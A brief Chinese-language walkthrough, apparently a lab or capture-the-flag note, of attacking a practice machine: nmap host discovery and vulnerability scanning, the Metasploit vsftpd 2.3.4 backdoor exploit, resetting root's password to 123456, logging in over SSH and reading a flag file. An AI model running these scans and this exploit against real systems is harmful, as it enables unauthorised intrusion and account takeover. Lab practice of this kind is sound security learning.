攻击别人的靶机
先nmap -sP 192.168.32.0/24 扫描一下
扫描192.168.32.0/24网段
看有哪些ip

然后在nmap –script=vuln 192.168.32.131
扫描一下 192.168.32.131 里面的漏洞 。 时间比较长

找开放的服务进行攻击,找漏洞进行攻击
方法很多,由于我太菜不会
我这里用vsftpd_234_backdoor 这个漏洞进行攻击
use exploit/ftp/vsftpd_234_backdoor
show options 查看配置
set rhost 192.168.32.131 设置靶机ip地址
run

输入passwd root修改密码
修改为123456

利用ssh进行连接
ssh 192.168.32.131

输入dir 查看一下 有一个flag的文件夹
cd flag 进入flag文件夹
dir 查看flag里面的文件 。 里面有一个flag.txt的文本
cat flag.txt 查看flag.txt的内容
出来falg为
roottoor741

其实只要加固好,只要不用脚本等什么东西。是攻击不进来的
